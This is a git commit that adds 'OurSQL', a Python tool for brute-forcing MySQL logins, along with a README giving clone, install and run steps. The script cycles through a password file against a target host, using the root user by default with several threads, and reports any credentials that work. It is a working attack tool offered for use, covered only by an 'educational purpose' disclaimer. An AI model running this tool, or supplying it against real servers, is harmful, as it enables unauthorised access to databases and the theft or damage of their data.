52c3a48ec95c9fd4b14a0bf8c979aba79ffd6f24
aqhmal <me@aqhmal.com>
2019-11-28 20:52:20 +0800

    first commit

---
+++ README.md
@@ -0,0 +1,17 @@
+# OurSQL
+
+![image](https://user-images.githubusercontent.com/22043590/69807530-79352180-1220-11ea-97ca-1bc58f9734a1.png)
+
+## How to use
+
+1. Clone this repository
+`git clone https://github.com/aqhmal/mysql_bruteforce.git`
+
+2. Install mysqlclient library using pip
+`pip3 install mysqlclient`
+
+3. Run the script
+`python3 mysql.py --host <domain or ip> --pass <file containing passwords>`
+
+You can check other options by using `-h` parameter.
+Note: This tool is for educational purpose only. If you use this tool for any illegal activity, I will not be responsible for any damage or loss.
---
+++ mysql.py
@@ -0,0 +1,101 @@
+#!/usr/bin/env python3
+# By Aqhmal
+# https://github.com/aqhmal/mysql_bruteforce
+
+import sys
+import argparse
+import MySQLdb
+from os import path
+from time import sleep
+from datetime import datetime
+from threading import Thread, activeCount
+
+status = False
+
+# Get current time in formatted form.
+def curTime():
+	now = datetime.now()
+	return now.strftime("%d/%m/%Y %I:%M:%S %p")
+
+# Show script banner.
+def showBanner():
+	print("\n\033[1;37m ██████╗ ██╗   ██╗██████╗ ███████╗ ██████╗ ██╗     ")
+	print("██╔═══██╗██║   ██║██╔══██╗██╔════╝██╔═══██╗██║     ")
+	print("██║   ██║██║   ██║██████╔╝███████╗██║   ██║██║     ")
+	print("██║   ██║██║   ██║██╔══██╗╚════██║██║▄▄ ██║██║     ")
+	print("╚██████╔╝╚██████╔╝██║  ██║███████║╚██████╔╝███████╗")
+	print(" ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝ ╚══▀▀═╝ ╚══════╝")
+	print("-----> \"Comrade, Your MySQL is now OurSQL\" <-----\033[1;m\n")
+
+# Show green text.
+def showSuccess(msg):
+	print("\033[1;32m[{}] [+] {}\033[1;m".format(curTime(), msg))
+
+# Show red text.
+def showFailure(msg):
+	print("\033[1;31m[{}] [-] {}\033[1;m".format(curTime(), msg))
+
+# Show white text.
+def showInfo(msg):
+	print("\033[1;37m[{}] [*] {}\033[1;m".format(curTime(), msg))
+
+# Check if file exists.
+def file_exists(parser, file):
+	if not path.exists(file):
+		parser.error("Password file not found ({})".format(file))
+	return [x.strip() for x in open(file)]
+
+def connect(host, user, password, port):
+	try:
+		conn = MySQLdb.connect(host=host, port=port, user=user, password=password, connect_timeout=3)
+		showSuccess("Login Success! {} : {}".format(user, password))
+		global status
+		status = True
+	except Exception as e:
+		# pass
+		showFailure("Login failed {} : {}".format(user, password))
+
+def exitScript():
+	showInfo("Exiting OurSQL...")
+	sys.exit()
+
+def main(args):
+	try:
+		global status
+		user = args.user
+		port = args.port
+		host = args.host
+		max_threads = args.thread
+		showInfo("Targeting {}:{}".format(host, port))
+		for password in args.passwords:
+			if status:
+				showSuccess("Successfully made the their MySQL to OurSQL!")
+				exitScript()
+			th = Thread(target=connect, args=(host, user, password, port))
+			th.daemon = True
+			th.start()
+			while activeCount() > max_threads:
+				sleep(0.001)
+		while activeCount() > 1:
+			sleep(0.001)
+		showFailure("Sorry comrade... your password file is not stronk enuff")
+		exitScript()
+	except KeyboardInterrupt:
+		exitScript()
+
+if __name__ == "__main__":
+	try:
+		showBanner()
+		desc = "MySQL Brute force script. Some says that KGB used this script during cold war."
+		args = argparse.ArgumentParser(description=desc)
+		args.add_argument("--pass", dest="passwords", type=lambda x: file_exists(args, x), required=True, help="The passwords file")
+		args.add_argument("--host", dest="host", type=str, required=True, help="The DBMS IP or domain")
+		args.add_argument("--port", dest="port", type=int, default=3306, help="The DBMS Port (Default: 3306)")
+		args.add_argument("--user", dest="user", type=str, default="root", help="The DBMS username (Default: root)")
+		args.add_argument("--thread", dest="thread", type=int, default=3, help="The number of threads (Defaut: 3)")
+		args = args.parse_args()
+		showInfo("Starting OurSQL")
+		main(args)
+	except KeyboardInterrupt:
+		showInfo("Exiting script")
+		sys.exit()
